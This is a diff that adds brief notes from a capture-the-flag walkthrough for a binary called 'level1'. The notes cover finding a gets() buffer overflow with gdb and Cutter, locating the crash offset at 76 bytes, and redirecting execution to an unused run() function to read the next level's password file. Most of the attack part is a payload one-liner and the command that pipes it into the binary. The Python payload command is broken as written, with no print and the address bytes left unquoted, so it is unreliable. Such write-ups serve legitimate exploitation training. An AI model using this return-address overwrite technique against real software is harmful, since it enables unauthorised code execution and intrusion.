@@ -1,0 +1,26 @@
+First thing first is to gdb the binary
+
+disas the main
+
+lets check vulnerabilities of gets function
+--> buffer overflow exploit
+
+lets try when the program crash sending longer and longer strings
+--> 76 chars it crash "Illegal instruction"
+
+By doing info functions we can see every functions used in the binary, we can see a run func lets disas it
+[...]
+run
+[...]
+
+Using cutter, we can see that run is a build in function that has been import but never used, so lets try to exploit the buffer overflow to call it.
+
+lets craft the payload
+
+python -c '"a" * 76 + \x80\x83\x04\x08' > /tmp/payload
+
+And use it 
+
+cat /tmp/payload - | ./level1
+
+gg now you can cat the .pass
